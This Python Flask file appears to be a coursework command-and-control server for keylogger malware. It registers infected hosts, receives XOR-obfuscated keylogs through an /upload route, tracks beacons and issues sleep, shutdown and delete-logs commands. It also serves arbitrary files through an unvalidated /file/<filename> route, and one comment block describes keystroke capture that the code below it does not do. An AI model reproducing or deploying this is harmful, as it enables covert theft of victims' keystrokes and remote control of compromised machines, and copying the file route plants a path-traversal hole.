from flask import Flask, request, render_template
from collections import defaultdict
from datetime import datetime, timedelta

app = Flask(__name__)

# In-memory "database" of registered malware
malware_db = {}
uploaded_files = defaultdict(list)

##############################################
#
#   Data encoding [5%] - Server side
#
#   Within this method is a simple encoding function which preassignes
#   one-byte key to the unique identifiers and log data, this function 
#   is called when the identifier has been assigned to the client and when
#   sending commands to client.
#
##############################################
KEY = 0x29
def xor_encryption(input, key = KEY):
    return "".join(chr(ord(c) ^ key) for c in input)
# Main server page contents, refer to server.txt
@app.route("/")
def main_page():
    return render_template('main_template.html', registered_malware_count = len(malware_db))

@app.route("/getlogs")
def get_logs():
    # get the unique_id from the query parameters
    unique_id = request.args.get('uid')
    # get the logs for this unique_id
    logs = malware_db.get(unique_id, {}).get('log_file', '')
    # return the logs
    return logs

@app.route("/register", methods=["POST"])
def register():
    # extract unique id and other info from the request
    unique_id = request.form.get("unique_id")
    host_info = request.form.get("host_info")
    # Decrypt the unique_id and host_info
    unique_id = xor_encryption(unique_id)
    host_info = xor_encryption(host_info)
    # register the malware
    malware_db[unique_id] = {
        'state': 'active', 
        'host_info': host_info, 
        'log_file': '',
        'last_beacon': datetime.now() 
        }
    return "Registered successfully."

@app.route("/list_clients")
def list_clients():
    clients = {}
    for client_id, client_info in malware_db.items():
        last_beacon = client_info.get('last_beacon')
        state = client_info.get('state')
        # if the client is sleeping or shutdown, display its state as it is
        if state.startswith('sleeping') or state == 'shutdown':
            clients[client_id] = state
        # otherwise, use the beacon time to determine if it's active or inactive
        elif last_beacon is not None and datetime.now() - last_beacon < timedelta(minutes = 1):
            clients[client_id] = 'active'
        else:
            clients[client_id] = 'inactive'
    return render_template('clients_template.html', clients = clients)


@app.route("/beacon", methods=["POST"])
def receive_beacon():
    unique_id = request.form.get('unique_id')
    if unique_id not in malware_db:
        return "Client not registered", 400
    # update the last beacon time for this client
    malware_db[unique_id]['last_beacon'] = datetime.now()

    return "Beacon received", 200

@app.route('/file/<filename>')
def view_file(filename):
    with open(filename, 'r') as file:
        return file.read()

@app.route("/sleep", methods=["POST"])
def sleep():
    unique_id = request.form.get("unique_id")
    minutes = "1"
    # validate the unique_id and minutes
    if unique_id in malware_db:
        malware_db[unique_id]['state'] = f"sleeping for {minutes} minutes"
        malware_db[unique_id]['last_beacon'] = None
        return "Command sent successfully."
    else:
        return "Invalid malware ID."

@app.route("/shutdown", methods=["POST"])
def shutdown():
    unique_id = request.form.get("unique_id")
    # validate the unique_id
    if unique_id in malware_db:
        malware_db[unique_id]['state'] = "shutdown"
        malware_db[unique_id]['last_beacon'] = None
        return "Command sent successfully."
    else:
        return "Invalid malware ID."

@app.route("/activate", methods=["POST"])
def activate():
    unique_id = request.form.get('unique_id')
    if unique_id not in malware_db:
        return "Client not registered", 400
    malware_db[unique_id]['state'] = 'active'
    malware_db[unique_id]['last_beacon'] = datetime.now()
    return "Client activated", 200

@app.route("/delete", methods=["POST"])
def delete():
    unique_id = request.form.get("unique_id")
    # validate the unique_id
    if unique_id in malware_db:
        malware_db[unique_id]['state'] = "delete logs"
        return "Command sent successfully."
    else:
        return "Invalid malware ID."
    
# Send log file data to server
@app.route("/upload", methods=["POST"])
def upload():
    # extract unique id and keylog from the request
    unique_id = request.form.get("unique_id")
    keylog = request.form.get("keylog")

    # Decrypt the unique_id and keylog
    unique_id = xor_encryption(unique_id)
    keylog = xor_encryption(keylog)
    # validate the unique_id
    if unique_id in malware_db:
        # append the keylog to the existing log for this malware
        malware_db[unique_id]['log_file'] += keylog
        return "Keylog uploaded successfully."
    else:
        return "Invalid malware ID."

##############################################
#
#   Command execution [5%] - Server side
#
#   Within this function, We save each keyevent from the associated key_event
#   class which contains a breakdown conversion for each key value.
#   This will continue to log keyevents until the 'esc' key has been activated
#   before writing and sending to server.
#
##############################################
@app.route("/get_commands", methods=["GET"])
def get_commands():
    unique_id = request.args.get('uid')
    if unique_id in malware_db:
        return malware_db[unique_id]['state']
    else:
        return "Invalid malware ID.", 400   
    
if __name__ == "__main__":
    app.run(ssl_context=('cert.pem', 'key.pem'))
